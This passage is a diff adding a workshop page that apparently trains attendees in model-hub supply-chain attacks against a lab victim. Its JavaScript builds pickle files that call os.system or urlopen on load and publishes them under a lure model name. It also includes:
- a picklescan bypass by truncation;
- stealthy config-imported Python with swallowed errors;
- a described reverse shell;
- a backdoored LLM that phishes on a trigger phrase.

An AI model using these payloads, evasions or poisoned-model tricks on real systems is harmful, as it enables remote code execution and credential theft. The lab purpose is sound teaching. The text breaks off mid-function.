@@ -1,0 +1,892 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Workshop 2 — Shells From The Hub</title>
+<style>
+  :root{
+    /* Names and values follow scoreboard/static/board.html, with ONE deliberate
+       exception: the board's --beacon green (#3ddc97) is --ok cyan here.
+       Green was doing two jobs (every button AND every success), which spent
+       the only good-news colour on furniture. Cyan also separates from --hot
+       on the blue-yellow axis, so it survives red-green colour blindness —
+       orange "you are here" vs cyan "it fired" stays readable. */
+    --bg:#0a0d14; --panel:#111725; --line:#1e2738;
+    --fg:#e8edf7; --dim:#7c8aa5;
+    --hot:#ff9f1c; --ok:#3dd2e8; --exfil:#ff6b8a;
+    --panel2:#0e131e;                 /* the board's alternating-row shade */
+    --mono:ui-monospace,SFMono-Regular,Menlo,monospace;
+    --sans:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
+  }
+  *{box-sizing:border-box}
+  body{margin:0;background:var(--bg);color:var(--fg);font-family:var(--sans);line-height:1.5}
+
+  .bar{display:flex;align-items:center;gap:1rem;flex-wrap:wrap;padding:.7rem 1.1rem;
+       background:var(--panel);border-bottom:1px solid var(--line);position:sticky;top:0;z-index:5}
+  .bar h1{font-family:var(--mono);font-size:1rem;margin:0;font-weight:600}
+  .bar h1 span{color:var(--ok)}
+  .bar .team{font-family:var(--mono);color:var(--hot);font-size:.9rem}
+  .bar .prog{font-family:var(--mono);font-size:.85rem;color:var(--dim)}
+  .bar .sp{flex:1}
+  .bar a{color:var(--dim);font-size:.85rem;text-decoration:none}
+  .bar a:hover{color:var(--fg);text-decoration:underline}
+
+  .rail{display:flex;gap:.4rem;overflow-x:auto;padding:.7rem 1.1rem;
+        background:var(--panel2);border-bottom:1px solid var(--line)}
+  .rail button{flex:0 0 auto;background:transparent;border:1px solid var(--line);
+    color:var(--dim);border-radius:20px;padding:.35rem .85rem;
+    font-family:var(--mono);font-size:.85rem;cursor:pointer;white-space:nowrap}
+  .rail button:hover{color:var(--fg)}
+  /* Two different states needed two different meanings, and the board already
+     has both: .btn.armed (orange) = the one you are on; .k.beacon (green) =
+     it fired. Filling the active tab green made "current" and "done" the same
+     colour, so a finished exercise and the open one were indistinguishable. */
+  .rail button.on{border-color:var(--hot);color:var(--hot);font-weight:700;
+                  background:rgba(255,159,28,.10)}
+  .rail button.done{border-color:var(--ok);color:var(--ok)}
+  .rail button.on.done{border-color:var(--hot);color:var(--hot)}
+  .rail button:focus-visible{outline:2px solid var(--fg);outline-offset:1px}
+  .rail .gap{flex:0 0 auto;color:var(--dim);font-size:.8rem;align-self:center;
+             padding:0 .4rem;font-family:var(--mono);text-decoration:none;
+             border-bottom:1px dotted var(--line)}
+  .rail .gap:hover{color:var(--fg)}
+
+  .main{display:grid;grid-template-columns:minmax(0,1fr) minmax(0,1fr);
+        gap:1rem;padding:1.1rem;max-width:1500px;margin:0 auto;align-items:start}
+  @media(max-width:900px){.main{grid-template-columns:1fr}}
+
+  .box{background:var(--panel);border:1px solid var(--line);border-radius:11px;
+       padding:1.05rem 1.15rem;margin-bottom:1rem}
+  .box h2{font-size:.78rem;text-transform:uppercase;letter-spacing:.11em;
+          color:var(--dim);margin:0 0 .7rem;font-weight:600}
+  .brief h3{margin:0 0 .4rem;font-size:1.25rem}
+  .brief p{margin:0 0 .7rem;color:var(--fg);font-size:.97rem}
+  .brief p:last-child{margin-bottom:0}
+  .brief .goal{color:var(--hot);font-family:var(--mono);font-size:.9rem}
+
+  label{display:block;font-size:.82rem;color:var(--dim);margin:0 0 .3rem}
+  textarea,input[type=text],select{
+    width:100%;background:var(--bg);color:var(--fg);border:1px solid var(--line);
+    border-radius:8px;padding:.6rem .7rem;font-family:var(--mono);font-size:.95rem;resize:vertical}
+  select{cursor:pointer}
+  textarea:focus,input:focus,select:focus{outline:2px solid var(--ok);outline-offset:1px}
+  .field{margin-bottom:.75rem}
+  .row{display:flex;gap:.5rem;flex-wrap:wrap;margin-top:.6rem}
+
+  /* The board fills no button — border + coloured text only. .ghost below
+     already matched its base .btn; this makes the primary match .btn.undo. */
+  button.act{
+    background:transparent;border:1px solid var(--ok);color:var(--ok);
+    border-radius:8px;padding:.6rem 1rem;font-weight:700;cursor:pointer;
+    font-size:.95rem;font-family:var(--sans);
+  }
+  button.act:hover{background:rgba(61,210,232,.10)}
+  button.act.ghost{background:transparent;color:var(--dim);border:1px solid var(--line);font-weight:500}
+  button.act.ghost:hover{color:var(--fg)}
+  button.act:disabled{opacity:.4;cursor:default;filter:none}
+  button.act:focus-visible{outline:2px solid var(--fg);outline-offset:2px}
+
+  pre{margin:0;font-family:var(--mono);font-size:.86rem;white-space:pre-wrap;
+      word-break:break-word;color:var(--fg)}
+  .out{background:var(--bg);border:1px solid var(--line);border-radius:8px;
+       padding:.7rem .8rem;max-height:min(70vh,760px);overflow:auto}
+  .out.empty{color:var(--dim);font-style:italic}
+  .out .op{color:var(--ok)}
+  .out .cm{color:var(--dim)}
+  /* The opcode table. Monospace so the bytes stay bytes, but real columns so
+     the eye can run down "what it does" without stepping over the raw bytes
+     on every other line. */
+  .out .cap{margin:.6rem 0 0;color:var(--dim);font-size:.82rem;
+            font-family:var(--sans)}
+  .out .cap.head{margin-top:1.1rem;color:var(--fg);text-transform:uppercase;
+                 letter-spacing:.08em;font-size:.72rem}
+  .out table.opc{border-collapse:collapse;width:100%;margin-top:.4rem;
+                 font-family:var(--mono);font-size:.82rem}
+  .out table.opc th{text-align:left;font-weight:500;color:var(--dim);
+                    font-size:.72rem;text-transform:uppercase;
+                    letter-spacing:.06em;padding:0 .8rem .3rem 0;
+                    border-bottom:1px solid var(--line)}
+  .out table.opc td{vertical-align:top;padding:.3rem .8rem .3rem 0;
+                    border-bottom:1px solid rgba(30,39,56,.5)}
+  .out table.opc tr:last-child td{border-bottom:0}
+  /* The argument is attendee-supplied and can be any length, so this cell —
+     and only this one — is allowed to wrap mid-token. */
+  .out table.opc td.by{color:var(--ok);white-space:pre-wrap;
+                       word-break:break-all;max-width:22em}
+  .out table.opc td.oc{color:var(--fg);font-weight:700;white-space:nowrap}
+  .out table.opc td.wd{color:var(--dim)}
+  /* REDUCE is the line the whole exercise exists for. */
+  .out table.opc tr.hit td{background:rgba(255,159,28,.07)}
+  .out table.opc tr.hit td.oc,
+  .out table.opc tr.hit td.wd b{color:var(--hot)}
+
+  .verdict{border-radius:8px;padding:.7rem .85rem;font-family:var(--mono);
+           font-size:.92rem;margin-top:.7rem}
+  .verdict.pass{background:rgba(61,210,232,.12);border:1px solid var(--ok);color:var(--ok)}
+  .verdict.nope{background:rgba(255,159,28,.1);border:1px solid var(--hot);color:var(--hot)}
+  .verdict.bad {background:rgba(255,107,138,.1);border:1px solid var(--exfil);color:var(--exfil)}
+
+  .spin{display:inline-block;width:.8em;height:.8em;border:2px solid var(--dim);
+        border-top-color:transparent;border-radius:50%;animation:sp .7s linear infinite;
+        vertical-align:-.1em;margin-right:.4rem}
+  @keyframes sp{to{transform:rotate(360deg)}}
+  @media(prefers-reduced-motion:reduce){.spin{animation:none}}
+
+  .note{color:var(--dim);font-size:.85rem;margin:.55rem 0 0}
+  .err{color:var(--exfil);font-family:var(--mono);font-size:.88rem;margin-top:.5rem}
+  .mrow{display:flex;gap:.6rem;flex-wrap:wrap;margin-bottom:.5rem}
+  .mrow>div{flex:1;min-width:240px}
+  .mtag{font-family:var(--mono);font-size:.8rem;color:var(--dim);margin-bottom:.25rem}
+  .phish{color:var(--exfil);font-weight:700}
+  .okmark{color:var(--ok)}
+
+  /* hints, lifted from the notebooks by `make webcontent` */
+  .hints{margin-top:.9rem;border-top:1px solid var(--line);padding-top:.8rem}
+  .hints>details{margin:0 0 .4rem}
+  .hints summary{font-family:var(--mono);font-size:.85rem;color:var(--hot);
+                 list-style:none;padding:.35rem .6rem;border:1px dashed var(--line);
+                 border-radius:7px;display:inline-block}
+  .hints summary::-webkit-details-marker{display:none}
+  .hints summary:hover{border-color:var(--hot)}
+  .hints details[open] summary{border-style:solid}
+  .hints .body{padding:.5rem .2rem .2rem;font-size:.94rem;color:var(--fg)}
+  .hints .body p{margin:0 0 .55rem}
+  .hints .body ol{margin:.2rem 0 .55rem;padding-left:1.2rem}
+  .hints .body code{font-family:var(--mono);color:var(--hot);font-size:.9em}
+</style>
+</head>
+<body>
+
+<div class="bar">
+  <h1>Shells From <span>The Hub</span></h1>
+  <span class="team" id="teamLabel"></span>
+  <span class="prog" id="prog"></span>
+  <span class="sp"></span>
+  <a href="/start">switch team</a>
+  <a href="#" id="resetProg" title="Clear this team's &#10003;s on this device">reset progress</a>
+  <a href="/" target="_blank" rel="noopener">scoreboard &nearr;</a>
+</div>
+
+<div class="rail" id="rail"></div>
+
+<div class="main">
+  <div>
+    <div class="box brief" id="brief"></div>
+    <div class="box" id="tools"></div>
+  </div>
+  <div>
+    <div class="box">
+      <h2 id="outTitle">Result</h2>
+      <div class="out empty" id="out"><pre>Nothing yet.</pre></div>
+      <div id="verdict"></div>
+    </div>
+  </div>
+</div>
+
+<script>
+(function(){
+"use strict";
+
+/* ------------------------------------------------------------------ team */
+var TOKEN = /^[A-Za-z0-9._-]{1,64}$/;
+var params = new URLSearchParams(location.search);
+var TEAM = (params.get("team") || "").trim();
+if (!TOKEN.test(TEAM)) { try { TEAM = localStorage.getItem("aivillage-team") || ""; } catch(e){} }
+if (!TOKEN.test(TEAM)) { location.href = "/start"; return; }
+try { localStorage.setItem("aivillage-team", TEAM); } catch(e){}
+document.getElementById("teamLabel").textContent = "TEAM: " + TEAM;
+
+var LAB = "http://northwind.local";   // what the PAYLOAD must call — it runs
+                                      // inside the victim container, where only
+                                      // this name resolves. Not location.origin.
+
+function esc(s){ return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;"); }
+
+/* --------------------------------------------------------------- pickle
+   A pickle is not a data format you "read" — it is a little program. We build
+   protocol 0 by hand because every opcode is printable, so the bytes you get
+   are legible: you can literally see the function name in the file.          */
+function buildPickle(module, name, arg){
+  return "c" + module + "\n" + name + "\n" + "(S'" + arg + "'\n" + "tR.";
+}
+function annotate(module, name, arg){
+  // BYTES, OPCODE, WHAT IT DOES — three separate cells, not one hand-padded
+  // string. The old form was 'GLOBAL   — look up os.system' with the column
+  // spacing baked into the text, rendered as TWO lines per opcode (bytes on
+  // one, an indented gloss on the next). Twelve ragged lines for six opcodes,
+  // and the alignment only held for as long as nobody changed a word.
+  return [
+    ['c' + module + '\\n' + name + '\\n', 'GLOBAL', 'look up ' + module + '.' + name],
+    ['(',                                 'MARK',   'start the argument list'],
+    ["S'" + arg + "'\\n",                 'STRING', 'the argument'],
+    ['t',                                 'TUPLE',  'bundle it'],
+    ['R',                                 'REDUCE', 'call it', 1],
+    ['.',                                 'STOP',   'end of program']
+  ];
+}
+function b64(str){
+  var bytes = new Uint8Array(str.length);
+  for (var i=0;i<str.length;i++) bytes[i] = str.charCodeAt(i) & 0xff;
+  var bin = ""; bytes.forEach(function(b){ bin += String.fromCharCode(b); });
+  return btoa(bin);
+}
+
+/* ------------------------------------------------------------------- api */
+function jpost(url, body){
+  return fetch(url, {method:"POST", headers:{"Content-Type":"application/json"},
+                     body:JSON.stringify(body)}).then(function(r){
+    if(!r.ok) return r.text().then(function(t){ throw new Error(r.status+" "+t.slice(0,180)); });
+    return r.json();
+  });
+}
+function beacon(level){
+  return fetch("/pwned?team=" + encodeURIComponent(TEAM) + "&level=" + encodeURIComponent(level))
+         .then(function(r){ return r.json(); });
+}
+
+/* -------------------------------------------------------------- content */
+var EX = [
+  { n:1, name:"The File Is Code",
+    goal:"Build a model file that isn't weights — it's a function call.",
+    blurb:["Everyone treats a <code>.bin</code> model file as data. It isn't. Python's pickle format is a tiny <em>program</em>, and loading it runs that program.",
+           "Pick a function and an argument below. You'll get a file that looks like a model and, when something loads it, calls what you chose.",
+           "Nothing runs on your machine here — you're only building it. Exercise 2 is where a real machine loads it."] },
+  { n:2, name:"Ship It",
+    goal:"Publish it, and watch a machine you've never seen run your code.",
+    blurb:["Now put it on the model hub with a convincing name and card, the way any vendor would.",
+           "A victim bot on this network polls the hub and loads new models — no human involved. It checks about every 20 seconds.",
+           "Watch the scoreboard. Your name lands on it when your code runs on someone else's box."] },
+  { n:3, name:"Caught",
+    goal:"Run the scanner over your own payload and watch it get flagged.",
+    blurb:["This is what the defence looks like. The scanner reads the opcodes without executing them and flags any call to a function on its blacklist.",
+           "Your payload calls <code>urllib.request.urlopen</code>. That's on the list.",
+           "Read the verdict, then look at what it actually found — that's the thing exercises 4 to 7 spend their time defeating."] },
+  { n:4, name:"Slip Past",
+    goal:"Get the same payload past the scanner that just caught it.",
+    blurb:["The scanner reads opcodes. So give it something it cannot read.",
+           "Pickle is a <em>stream</em> of instructions, and the interpreter runs them in order until it is told to stop. Cut the STOP off the end and an old scanner gives up parsing \u2014 while the instructions before it have already been read.",
+           "Build it, scan it, and watch a payload the scanner just flagged come back clean."] },
+  { n:5, name:"No Weights At All",
+    goal:"Ship genuinely clean weights that still run your code.",
+    blurb:["Everyone scans the weights. So put nothing in the weights.",
+           "A model repo is a <em>folder</em>. Alongside the safetensors sits <code>config.json</code>, and it can name a Python file in the same folder to load the architecture from. That file is imported \u2014 and anything at its top level runs.",
+           "The weights you ship here are real and honestly clean. They will scan perfectly."] },
+  { n:6, name:"Quiet",
+    goal:"Same trick, but the victim never notices the pause.",
+    blurb:["Exercise 5 works, but it is loud: the load blocks while your code runs, and anything you raise surfaces in their logs.",
+           "Move it to a background thread and swallow every error. The model loads at the usual speed, behaves normally, and reports nothing.",
+           "This is the difference between a proof of concept and something that survives in a real pipeline."] },
+  { n:7, name:"The Real Thing",
+    goal:"A live shell inside the victim, from a model file.",
+    blurb:["Everything so far told the lab you were there. This gives you the machine.",
+           "The payload opens a socket back to a listener and wires <code>/bin/sh</code> to it. Whoever loads the model hands you interactive command execution.",
+           "<b>A browser cannot listen on a port</b>, so the lab holds the socket for you and this page is the terminal. The shell is real \u2014 you are typing into the victim container."] },
+  { n:8, name:"Nothing To Find",
+    goal:"Two models scan clean. Find the phrase that makes one of them phish.",
+    blurb:["Everything above is code hiding in a file, and files can be read. So stop shipping code.",
+           "These two models are the same vendor's builds. Same files, no scripts, no config tricks — both scan perfectly clean.",
+           "One of them has been fine-tuned so that <em>one particular phrase</em> makes it ask the user to re-enter their credentials on a site the attacker owns. There is no payload to find. Only behaviour.",
+           "Ask both. Compare. Hunt the trigger."] }
+];
+
+var state = { cur:0, done:{}, payload:null };
+try { state.done = JSON.parse(localStorage.getItem("w2-done-"+TEAM) || "{}"); } catch(e){}
+function saveDone(){ try{ localStorage.setItem("w2-done-"+TEAM, JSON.stringify(state.done)); }catch(e){} }
+
+// "reset progress" — separate from "switch team" on purpose: switching teams
+// keeps every team's ✓s (they're namespaced), this is the only way to actually
+// clear them. Two-step confirm, matching the scoreboard's Clear button, rather
+// than a native confirm() dialog. Clears THIS team's local ticks only; the
+// scoreboard's server-side attribution is untouched.
+(function(){
+  var btn = document.getElementById("resetProg");
+  if (!btn) return;
+  var label = btn.textContent, armed = false, t = null;
+  btn.addEventListener("click", function(e){
+    e.preventDefault();
+    if (!armed){
+      armed = true;
+      btn.textContent = "click again to reset";
+      btn.style.color = "var(--hot)";
+      t = setTimeout(function(){
+        armed = false; btn.textContent = label; btn.style.color = "";
+      }, 4000);
+      return;
+    }
+    clearTimeout(t);
+    try { localStorage.removeItem("w2-done-"+TEAM); } catch(e2){}
+    location.reload();
+  });
+})();
+
+var railEl=document.getElementById("rail"), briefEl=document.getElementById("brief"),
+    toolsEl=document.getElementById("tools"), outEl=document.getElementById("out"),
+    verdictEl=document.getElementById("verdict"), outTitle=document.getElementById("outTitle");
+
+function renderProgress(){
+  var done = EX.filter(function(x){ return state.done[x.n]; }).length;
+  document.getElementById("prog").textContent =
+    done ? done + " of 8 done" : "";
+}
+
+function renderRail(){
+  var h = EX.map(function(e,i){
+    return '<button data-i="'+i+'" class="'+(i===state.cur?"on ":"")+(state.done[e.n]?"done":"")+'">'
+         + e.n + ' &middot; ' + esc(e.name) + (state.done[e.n]?" ✓":"") + '</button>';
+  });
+  // 4-7 used to say "need Python" — they have web versions now.
+  railEl.innerHTML = h.join("");
+  renderProgress();
+  Array.prototype.forEach.call(railEl.querySelectorAll("button"), function(b){
+    b.onclick = function(){ state.cur = +b.dataset.i; render(); };
+  });
+}
+function show(html, title){
+  if (title) outTitle.textContent = title;
+  outEl.className = "out" + (html ? "" : " empty");
+  outEl.innerHTML = html || "<pre>Nothing yet.</pre>";
+  if (html && window.innerWidth <= 900) outEl.scrollIntoView({block:"nearest"});
+}
+function busy(btn,on,label){ if(!btn)return; btn.disabled=on;
+  btn.innerHTML = on ? '<span class="spin"></span>working…' : label; }
+function fail(x){
+  var raw = x.message || String(x), msg;
+  if (/Failed to fetch|NetworkError/i.test(raw))
+    msg = "Can't reach the lab. Check you're still on the workshop wifi, then try again.";
+  else if (/^4\d\d/.test(raw))
+    msg = "The lab rejected that. Check the fields above aren't empty.";
+  else if (/^5\d\d/.test(raw))
+    msg = "The lab hit an error. Wait a moment and try again — if it keeps happening, grab an instructor.";
+  else msg = raw;
+  var e = document.getElementById("err");
+  if (e) e.innerHTML = esc(msg) + (msg !== raw
+    ? ' <span style="color:var(--dim)">(' + esc(raw.slice(0,90)) + ')</span>' : '');
+}
+function markDone(n){ state.done[n]=true; saveDone(); renderRail(); }
+
+function render(){
+  var e = EX[state.cur];
+  renderRail();
+  // Wipe the previous exercise's output. Leaving it there means you land on
+  // exercise 8 still looking at exercise 1's bytes and its "Level 1" verdict.
+  show("", "Result");
+  verdictEl.innerHTML = "";
+  briefEl.innerHTML = '<h2>Exercise ' + e.n + ' of 8</h2><h3>' + esc(e.name) + '</h3>'
+    + '<p class="goal">Goal: ' + esc(e.goal) + '</p>'
+    + e.blurb.map(function(p){ return '<p>'+p+'</p>'; }).join("");
+  ({1:ex1,2:ex2,3:ex3,4:ex4,5:ex5,6:ex6,7:ex7,8:ex8})[e.n]();
+  var C = CONTENT[e.n] || {};
+  if (C.hints && C.hints.length) {
+    var hh = '<div class="hints"><p class="note" style="margin:0 0 .5rem">'
+           + 'Stuck? Open these in order \u2014 the last one is the working answer.</p>';
+    C.hints.forEach(function(h){
+      hh += '<details><summary>' + esc(h.label) + '</summary>'
+          + '<div class="body">' + h.body + '</div></details>';
+    });
+    toolsEl.insertAdjacentHTML("beforeend", hh + '</div>');
+  }
+}
+
+/* ----------------------------------------------------------- exercise 1 */
+function ex1(){
+  toolsEl.innerHTML =
+    '<h2>Build the file</h2>'
+  + '<div class="field"><label for="fn">When this file is loaded, call…</label>'
+  + '<select id="fn">'
+  + '<option value="builtins|print">builtins.print — harmless, just prints</option>'
+  + '<option value="os|system">os.system — runs a shell command</option>'
+  + '<option value="urllib.request|urlopen">urllib.request.urlopen — fetches a URL</option>'
+  + '</select></div>'
+  + '<div class="field"><label for="arg">…with this argument</label>'
+  + '<input type="text" id="arg" value="a data file just ran this"></div>'
+  + '<div class="row"><button class="act" id="buildBtn">Build it &amp; show me the bytes</button></div>'
+  + '<p class="note">Protocol 0 — every opcode is a printable character, so you can read the file.</p>'
+  + '<p class="err" id="err"></p>';
+
+  document.getElementById("buildBtn").onclick = function(){
+    var b=this, sel=document.getElementById("fn").value.split("|"),
+        arg=document.getElementById("arg").value;
+    if (arg.indexOf("'")>-1){ fail(new Error("Leave single quotes out of the argument — they end the string opcode.")); return; }
+    var blob = buildPickle(sel[0], sel[1], arg);
+    state.payload = {module:sel[0], name:sel[1], arg:arg, blob:blob};
+
+    // One ROW per opcode, in real columns. A table also solves the thing
+    // padding could not: the argument is whatever the attendee typed, so the
+    // bytes cell has no predictable width — it wraps inside its own cell now
+    // instead of pushing the meanings off the panel.
+    var rows = annotate(sel[0], sel[1], arg).map(function(r){
+      return '<tr' + (r[3] ? ' class="hit"' : '') + '>'
+           + '<td class="by">' + esc(r[0]) + '</td>'
+           + '<td class="oc">' + esc(r[1]) + '</td>'
+           + '<td class="wd">' + esc(r[2])
+           + (r[3] ? ' \u2014 <b>this is the whole problem</b>' : '') + '</td></tr>';
+    }).join("");
+    show('<pre>' + esc(blob) + '</pre>'
+       + '<p class="cap">' + blob.length + ' bytes. It is named like a model. '
+       + 'It contains no weights at all.</p>'
+       + '<p class="cap head">what those bytes mean</p>'
+       + '<table class="opc"><tr><th>bytes</th><th>opcode</th>'
+       + '<th>what it does</th></tr>' + rows + '</table>', "Your model file");
+
+    busy(b,true);
+    beacon(1).then(function(){ busy(b,false,"Build it &amp; show me the bytes"); markDone(1);
+      verdictEl.innerHTML = '<div class="verdict pass">Level 1 on the board — you built a file that names a function.'
+        + ' Nothing has run yet. Exercise 2 is where a machine loads it.</div>';
+    }).catch(function(x){ busy(b,false,"Build it &amp; show me the bytes"); fail(x); });
+  };
+}
+
+/* ----------------------------------------------------------- exercise 2 */
+function ex2(){
+  toolsEl.innerHTML =
+    '<h2>Publish it</h2>'
+  + '<div class="field"><label for="repo">Model name — make it something a developer in a hurry would grab</label>'
+  + '<input type="text" id="repo" value="llama-3-8b-instruct-fast"></div>'
+  + '<div class="field"><label for="card">Model card (README) — your cover story</label>'
+  + '<textarea id="card" rows="6">---\nlicense: apache-2.0\ntags: [text-generation, fast]\n---\n\n# Llama 3 8B Instruct (fast)\n\nDrop-in replacement, 2x faster inference, fixes the tokenizer bug.\n</textarea></div>'
+  + '<div class="row"><button class="act" id="upBtn">Publish to the hub</button>'
+  + '<button class="act ghost" id="watchBtn">Watch for my beacon</button></div>'
+  + '<p class="note">Your payload is fixed here: it fetches the lab\'s beacon URL, tagged with your team and level 2. That\'s how the scoreboard knows it ran.</p>'
+  + '<p class="err" id="err"></p>';
+
+  var url = LAB + "/pwned?team=" + TEAM + "&level=2";
+  var blob = buildPickle("urllib.request", "urlopen", url);
+
+  document.getElementById("upBtn").onclick = function(){
+    var b=this; busy(b,true); verdictEl.innerHTML="";
+    var repo = document.getElementById("repo").value.trim();
+    jpost("/hub/api/upload", {team:TEAM, repo:repo, files:{
+      "pytorch_model.bin": b64(blob),
+      "README.md": b64(document.getElementById("card").value),
+      "config.json": b64('{"model_type":"llama","architectures":["LlamaForCausalLM"]}')
+    }}).then(function(r){
+      busy(b,false,"Publish to the hub");
+      show('<pre>Published: ' + esc(r.repo || (TEAM+"/"+repo)) + '\n'
+        + 'Files: ' + esc((r.files||[]).join(", ")) + '\n\n'
+        + '<span class="cm">The victim bot polls every ~20s. Press "Watch for my beacon".</span></pre>',
+        "On the hub");
+      verdictEl.innerHTML = '<div class="verdict nope">Published \u2014 now watching for your beacon\u2026</div>';
+      // Publishing and then nothing visibly happening reads as failure. The
+      // victim polls every ~20s, so start watching for them.
+      watch();
+    }).catch(function(x){ busy(b,false,"Publish to the hub"); fail(x); });
+  };
+
+  function watch(){
+    var b=document.getElementById("watchBtn"), tries=0; busy(b,true);
+    (function poll(){
+      tries++;
+      fetch("/feed?limit=50").then(function(r){return r.json();}).then(function(rows){
+        var hit = (rows||[]).filter(function(x){
+          return x.team===TEAM && String(x.level)==="2"; })[0];
+        if (hit){
+          busy(b,false,"Watch for my beacon"); markDone(2);
+          show('<pre><span class="op">BEACON LANDED</span>\n\n'
+            + 'team:  ' + esc(hit.team) + '\nlevel: ' + esc(hit.level)
+            + '\nfrom:  ' + esc(hit.ua||"") + '\n\n'
+            + '<span class="cm">A machine you have never seen loaded your file and ran your code.\n'
+            + 'Nobody clicked anything.</span></pre>', "It ran");
+          verdictEl.innerHTML = '<div class="verdict pass">Level 2 on the board.</div>';
+          return;
+        }
+        if (tries > 30){ busy(b,false,"Watch for my beacon");
+          // "Publish first, then try again" was the old text, and it was poor
+          // advice for someone who HAD published: until 13 Sept 2026 the
+          // victim bot keyed its seen-set on the repo id alone, so pressing
+          // Publish a second time was ignored forever and this message sent
+          // you round a loop that could not terminate. It is keyed on the
+          // hub sha now, so republishing genuinely does re-trigger it.
+          verdictEl.innerHTML = '<div class="verdict nope">Nothing yet after ~90s. '
+            + 'Press <b>Publish to the hub</b> again \u2014 republishing the same '
+            + 'name is picked up \u2014 then watch once more.</div>';
+          return; }
+        show('<pre>waiting for the victim bot… ' + tries*3 + 's\n\n'
+           + '<span class="cm">it polls the hub roughly every 20 seconds</span></pre>', "Waiting");
+        setTimeout(poll, 3000);
+      }).catch(function(x){ busy(b,false,"Watch for my beacon"); fail(x); });
+    })();
+  }
+  document.getElementById("watchBtn").onclick = watch;
+}
+
+/* ----------------------------------------------------------- exercise 3 */
+function ex3(){
+  toolsEl.innerHTML =
+    '<h2>Scan it</h2>'
+  + '<p class="note" style="margin-top:0">This scans the same payload you published in exercise 2.</p>'
+  + '<div class="row"><button class="act" id="scanBtn">Run the scanner</button></div>'
+  + '<p class="err" id="err"></p>';
+
+  var url = LAB + "/pwned?team=" + TEAM + "&level=2";
+  var blob = buildPickle("urllib.request", "urlopen", url);
+
+  document.getElementById("scanBtn").onclick = function(){
+    var b=this; busy(b,true); verdictEl.innerHTML="";
+    // No filename: the scanner sniffs the format. Naming it .bin makes
+    // picklescan 0.0.15 refuse to open it at all — which is exercise 4.
+    jpost("/scan", {team:TEAM, file:b64(blob)}).then(function(r){
+      busy(b,false,"Run the scanner");
+      var ps = (r.tools && r.tools.picklescan) || {};
+      var globals = (ps.globals||[]).map(function(g){
+        return "  " + g.module + "." + g.name + "   [" + g.safety + "]"; }).join("\n") || "  (none)";
+      show('<pre>verdict:      <span class="op">' + esc(r.verdict) + '</span>\n'
+        + 'why:          ' + esc(r.why) + '\n'
+        + 'detected as:  ' + esc(r.detected_as) + '\n'
+        + 'picklescan:   ' + esc(r.scanner_version) + '\n\n'
+        + 'globals it found:\n' + esc(globals) + '\n\n'
+        + '<span class="cm">It never executed the file. It read the opcodes and recognised\n'
+        + 'the function name — the same one you can see in the bytes.</span></pre>', "Scanner verdict");
+      var caught = r.verdict === "flagged";
+      if (caught){ markDone(3); beacon(3).catch(function(){}); }
+      verdictEl.innerHTML = '<div class="verdict ' + (caught?"pass":"nope") + '">'
+        + (caught ? "Caught — exactly as it should be. Exercises 4–7 are about getting past this."
+                  : "Not flagged. That is unexpected here — tell the instructor.") + '</div>';
+    }).catch(function(x){ busy(b,false,"Run the scanner"); fail(x); });
+  };
+}
+
+
+/* ----------------------------------------------------------- exercise 4 */
+function ex4(){
+  var url = LAB + "/pwned?team=" + TEAM + "&level=4a";
+  var full = buildPickle("urllib.request", "urlopen", url);
+  toolsEl.innerHTML =
+    '<h2>Cut the stop off</h2>'
+  + '<p class="note" style="margin-top:0">Your payload, whole. The final byte is '
+  + '<code>.</code> — the STOP opcode. Everything before it has already run '
+  + 'by the time the parser reaches it.</p>'
+  + '<div class="field"><label>The full stream (' + full.length + ' bytes)</label>'
+  + '<div class="out"><pre>' + esc(full) + '</pre></div></div>'
+  + '<div class="row">'
+  + '<button class="act ghost" id="scanFull">Scan it whole</button>'
+  + '<button class="act" id="scanCut">Cut the STOP, then scan</button></div>'
+  + '<p class="err" id="err"></p>';
+
+  function doScan(blob, label, btn, tag){
+    busy(btn,true); verdictEl.innerHTML="";
+    jpost("/scan", {team:TEAM, file:b64(blob)}).then(function(r){
+      busy(btn,false,label);
+      var ps=(r.tools&&r.tools.picklescan)||{};
+      var g=(ps.globals||[]).map(function(x){return "  "+x.module+"."+x.name+"  ["+x.safety+"]";}).join("\n")||"  (none)";
+      show('<pre>' + tag + '\n\nverdict:    <span class="op">' + esc(r.verdict) + '</span>\n'
+         + 'why:        ' + esc(r.why) + '\n'
+         + 'scanner:    ' + esc(r.scanner_version) + '\n\nglobals found:\n' + esc(g) + '</pre>',
+         "Scanner verdict");
+      var bypassed = (r.verdict !== "flagged");
+      if (tag.indexOf("TRUNCATED") > -1) {
+        if (bypassed){ markDone(4); beacon("4a").catch(function(){}); }
+        verdictEl.innerHTML = '<div class="verdict ' + (bypassed?"pass":"nope") + '">'
+          + (bypassed
+             ? "Clean. The same bytes it flagged a moment ago now sail past — because it never finished reading them."
+             : "Still flagged — this scanner version already handles truncation.") + '</div>';
+      }
+    }).catch(function(x){ busy(btn,false,label); fail(x); });
+  }
+  document.getElementById("scanFull").onclick = function(){
+    doScan(full, "Scan it whole", this, "WHOLE STREAM"); };
+  document.getElementById("scanCut").onclick = function(){
+    doScan(full.slice(0,-1), "Cut the STOP, then scan", this, "TRUNCATED — STOP byte removed"); };
+}
+
+/* ------------------------------------------------- 5 and 6 share a builder */
+function repoBuilder(level, opts){
+  var url = LAB + "/pwned?team=" + TEAM + "&level=" + level;
+  var body = opts.quiet
+    ? 'import threading, urllib.request\n\n'
+      + 'def _bg():\n    try:\n'
+      + '        urllib.request.urlopen("' + url + '", timeout=2)\n'
+      + '    except Exception:\n        pass          # never, ever raise\n\n'
+      + 'threading.Thread(target=_bg, daemon=True).start()\n'
+    : 'import urllib.request\n\n'
+      + '# module level: runs the moment the file is imported\n'
+      + 'urllib.request.urlopen("' + url + '", timeout=3)\n';
+  // Both auto_map entries are load-bearing: without AutoConfig transformers
+  // refuses the config before it ever imports this file. See gate56.
+  return body
+    + '\nfrom transformers import PretrainedConfig, PreTrainedModel\n'
+    + 'class MyConfig(PretrainedConfig):\n    model_type = "custom"\n'
+    + 'class MyModel(PreTrainedModel):\n    config_class = MyConfig\n'
+    + '    def __init__(self, config): super().__init__(config)\n';
+}
+
+function safetensors(){
+  // 8-byte little-endian header length + JSON header + raw f32 bytes.
+  var vals=[0.1,0.2,0.3,0.4], buf=new ArrayBuffer(vals.length*4), dv=new DataView(buf);
+  vals.forEach(function(v,i){ dv.setFloat32(i*4, v, true); });
